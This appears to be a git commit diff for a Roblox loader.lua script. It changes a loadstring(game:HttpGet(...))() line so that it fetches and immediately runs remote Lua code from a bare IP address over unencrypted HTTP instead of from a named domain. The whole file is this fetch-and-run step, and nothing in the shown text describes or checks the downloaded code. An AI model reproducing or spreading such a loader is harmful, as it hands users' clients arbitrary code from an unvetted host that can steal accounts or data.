0ff1acea025b333f403f56d0e6053385ff48b823
Roblox Scripts <gregyheport@gmail.com>
2025-08-24 11:50:42 +0800

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,2 +1,2 @@
 ID="07e5726b-8742-4a8a-a98a-4942db9f929b";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
